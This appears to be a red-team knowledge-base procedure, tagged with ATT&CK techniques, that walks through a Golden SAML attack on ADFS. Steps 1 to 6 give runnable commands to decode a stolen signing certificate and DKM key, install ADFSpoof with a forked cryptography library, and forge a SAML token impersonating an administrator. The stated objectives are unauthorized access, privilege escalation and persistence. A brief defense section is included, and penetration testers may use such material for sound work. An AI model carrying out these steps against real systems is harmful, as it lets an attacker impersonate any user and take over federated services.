---
type: procedure
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
techniques:
  - >-
    [[techniques/Modify Authentication Process|T1556 - Modify Authentication
    Process]]
  - '[[techniques/Unsecured Credentials|T1552 - Unsecured Credentials]]'
sub_techniques:
  - '[[sub-techniques/Private Keys|T1552.004 - Private Keys]]'
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/Active Directory Federation Services]]'
  - '[[tags/ADFS - Golden SAML]]'
commands:
  - '[[commands/create-adfsspoof-tools-directory-and-clone-repositories]]'
  - '[[commands/create-and-activate-python-virtual-environment]]'
  - '[[commands/decode-encrypted-pfx-to-binary]]'
  - '[[commands/execute-adfsspoof-python-script-for-golden-saml]]'
  - '[[commands/extract-private-key-to-binary]]'
  - '[[commands/install-python-dependencies-for-adfsspoof]]'
platforms:
  - Windows
tools: []
verified: true
validated: true
---

# Golden-SAML-Attack-via-ADFS

## Summary

This procedure demonstrates how to perform a Golden SAML attack by forging SAML tokens using a compromised private key from an ADFS signing certificate. It involves setting up the necessary tools and environment, decoding the PFX certificate and private key to binary format, and executing the ADFSpoof tool to generate a forged token for impersonating users or services in a federated Active Directory environment.

## Description

In a Golden SAML attack, an attacker compromises the private key associated with a SAML signing certificate used by Active Directory Federation Services (ADFS). This allows the creation of arbitrary SAML assertions that can impersonate any user or service principal, bypassing authentication in federated environments. The procedure uses the ADFSpoof tool from Mandiant, combined with a modified cryptography library, to sign forged SAML tokens. It targets ADFS setups where the signing certificate's private key has been extracted (e.g., via prior compromise). Once executed, the forged token can be used to access relying party applications protected by SAML, such as Office 365 or custom web apps. This technique is particularly effective in hybrid identity scenarios and requires the attacker to have the base64-encoded PFX and hex-encoded private key.

## Requirements

1. Access to the ADFS server or network segment to obtain the SAML signing certificate's PFX file and private key.
2. Base64-encoded PFX certificate and hex-encoded private key of the SAML signing certificate.
3. Python 3 environment on a Linux or macOS attacker machine (Kali Linux recommended).
4. Git and pip installed.
5. Network access to the ADFS endpoint (e.g., https://adfs.example.com/adfs/ls).

## Defense

- Securely store and protect private keys of SAML signing certificates using hardware security modules (HSMs) or strict access controls.
- Monitor ADFS event logs for anomalous token issuance or unusual authentication patterns from trusted issuers.
- Implement certificate pinning or token validation checks on relying parties to detect forged signatures.
- Rotate signing certificates regularly and monitor for key extraction attempts via audit logs.
- Enable multi-factor authentication (MFA) on federated applications to add a layer beyond SAML tokens.

## Objectives

1. Forge a valid SAML token impersonating a high-privilege user (e.g., domain administrator) to gain unauthorized access.
2. Use the forged token to authenticate to SAML-protected resources in the federated environment.
3. Establish persistence or escalate privileges by accessing sensitive services like Azure AD or on-premises resources.

## Instructions

### Step 1: Decode the Encrypted PFX Certificate

**Context**: Convert the base64-encoded PFX certificate to binary format for use with ADFSpoof. This step prepares the encrypted certificate file required for token forging.

**Command** ([[commands/decode-encrypted-pfx-to-binary]]):
```bash
echo $_BASE64_ENCODED_PFX | base64 -d > EncryptedPfx.bin
```

> This command decodes the provided base64 string and saves it as a binary file. Replace $_BASE64_ENCODED_PFX with the actual base64 content of the PFX. Verify the file creation with `ls -la EncryptedPfx.bin` to ensure it exists and has the expected size.

### Step 2: Extract the Private Key to Binary

**Context**: Convert the hexadecimal-encoded private key (DKM key) to binary format. This key is used to sign the forged SAML token, making it appear legitimate.

**Command** ([[commands/extract-private-key-to-binary]]):
```bash
echo $_HEX_PRIVATE_KEY | xxd -r -p > dkmKey.bin
```

> Decode the hex string to binary and save as dkmKey.bin. Replace $_HEX_PRIVATE_KEY with the actual hex value. Confirm success by checking `file dkmKey.bin` outputs binary data.

### Step 3: Create Directory and Clone Repositories

**Context**: Set up a working directory and clone the required repositories: a modified cryptography library (to handle ADFS-specific signing) and the ADFSpoof tool.

**Command** ([[commands/create-adfsspoof-tools-directory-and-clone-repositories]]):
```bash
mkdir ADFSpoofTools
cd $_
git clone https://github.com/dmb2168/cryptography.git
git clone https://github.com/mandiant/ADFSpoof.git
```

> This creates a project directory and clones the repos. Ensure you are in the ADFSpoofTools directory afterward (`pwd` should show the path). If cloning fails, check network connectivity or Git installation.

### Step 4: Create and Activate Virtual Environment

**Context**: Isolate the Python dependencies to avoid conflicts, using virtualenv for a clean environment.

**Command** ([[commands/create-and-activate-python-virtual-environment]]):
```bash
virtualenv3 venvADFSSpoof
source venvADFSSpoof/bin/activate
```

> Creates and activates the virtual environment. Your prompt should change to indicate (venvADFSSpoof). If virtualenv3 is not available, install it via `pip install virtualenv` or use `python3 -m venv`.

### Step 5: Install Python Dependencies

**Context**: Install required packages for XML signing and cryptography handling, including uninstalling the default cryptography to use the modified version.

**Command** ([[commands/install-python-dependencies-for-adfsspoof]]):
```bash
pip install lxml
pip install signxml
pip uninstall -y cryptography
cd cryptography
pip install -e .
cd ../ADFSpoof
pip install -r requirements.txt
```

> Installs lxml and signxml globally in the venv, then replaces the standard cryptography with the forked version, and installs ADFSpoof requirements. Watch for errors during uninstall/install; if cryptography uninstall fails, force with `-y`. Verify with `pip list | grep cryptography`.

### Step 6: Execute ADFSpoof to Forge SAML Token

**Context**: Run the ADFSpoof script with the prepared binary files to generate a forged SAML token targeting a specific endpoint and user.

**Command** ([[commands/execute-adfsspoof-python-script-for-golden-saml]]):
```bash
python ADFSpoof.py -b EncryptedPfx.bin dkmKey.bin -s $_ADFS_SERVER saml2 --endpoint $_ADFS_ENDPOINT --nameidformat urn:oasis:names:tc:SAML:2.0:nameid-format:transient --nameid '$_DOMAIN\\$_USERNAME' --rpidentifier $_RP_IDENTIFIER --assertions '$_ASSERTIONS'
```

> This forges the SAML token using the binaries, server details, and custom assertions. Replace parameters: $_ADFS_SERVER (e.g., adfs.pentest.lab), $_ADFS_ENDPOINT (e.g., https://www.contoso.com/adfs/ls/SamlResponseServlet), $_DOMAIN (e.g., PENTEST), $_USERNAME (e.g., administrator), $_RP_IDENTIFIER (e.g., Supervision), $_ASSERTIONS (XML attribute string). The output will be a base64-encoded SAML response; save it for use in a browser or tool like SAML Tracer.
